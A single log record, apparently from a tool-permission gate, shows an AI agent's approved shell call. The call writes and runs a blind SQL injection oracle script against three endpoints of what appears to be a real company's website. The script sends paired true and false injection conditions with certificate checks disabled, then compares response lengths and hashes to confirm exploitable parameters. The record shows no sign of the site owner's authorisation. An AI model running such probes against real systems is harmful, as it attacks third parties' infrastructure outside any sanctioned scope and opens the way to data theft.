{"ts": 1790751866.518101, "decision_id": "7ae25f4cfb43", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && mkdir -p w16b && cat > w16b/sqli_oracle.py <<'PY'\nimport subprocess,re,statistics,sys,hashlib\nBASE=\"https://www.infinitycapital.bh\"\ndef norm(b):\n    s=b.decode('utf8','replace')\n    s=re.sub(r'bom1::\\d+-[A-Za-z0-9]+','REQID',s)\n    s=re.sub(r'[^ ]*NTI1YWRj[^`]*','TOKEN',s)\n    return s\ndef get(url):\n    p=subprocess.run(['curl','-sk','-m','20',url],capture_output=True)\n    return p.stdout\ndef test(urlbase,param,N=12):\n    cases={\n     'baseline':f'{urlbase}?{param}=1',\n     'TRUE_1AND1':f'{urlbase}?{param}=1 AND 1=1',\n     'FALSE_1AND2':f'{urlbase}?{param}=1 AND 1=2',\n     'TRUE_2':f'{urlbase}?{param}=1%20AND%201%3D1',\n     'FALSE_2':f'{urlbase}?{param}=1%20AND%201%3D2',\n    }\n    res={}\n    for k,u in cases.items():\n        lens=[];hashes=set()\n        for _ in range(N):\n            b=get(u); n=norm(b)\n            lens.append(len(n)); hashes.add(hashlib.md5(n.encode()).hexdigest()[:8])\n        res[k]=(lens,hashes)\n        print(f\"  {k:12s} len min/mean/max={min(lens)}/{statistics.mean(lens):.1f}/{max(lens)}  distinct_hashes={len(hashes)}\")\n    return res\nfor ep,param in [(\"https://www.infinitycapital.bh/\",\"page\"),\n                 (\"https://www.infinitycapital.bh/api/\",\"id\"),\n                 (\"https://www.infinitycapital.bh/contact\",\"cb\")]:\n    print(\"=\"*70); print(f\"{ep} ?{param}=\")\n    try: test(ep,param)\n    except Exception as e: print(\"  ERR\",e)\nPY\npython3 w16b/sqli_oracle.py 2>&1 | tail -30"}
